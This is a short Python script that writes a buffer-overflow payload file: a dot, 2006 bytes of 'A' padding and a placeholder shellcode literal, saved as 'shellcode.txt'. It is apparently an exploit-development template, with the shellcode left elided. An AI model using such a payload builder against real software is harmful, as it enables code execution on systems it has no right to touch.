
import sys, struct

file_suffix = 'shellcode.txt'
buf = b'.'  # Note the b prefix indicating a bytes literal

buf += b'A' * 2006  # buffer

# Assuming you have your shellcode as a bytes object
# For example:
shellcode = b'\xdb\xc0...'  # Your actual shellcode here

buf += shellcode

# Open the file in binary mode for writing
with open(file_suffix, 'wb') as f:
    f.write(buf)

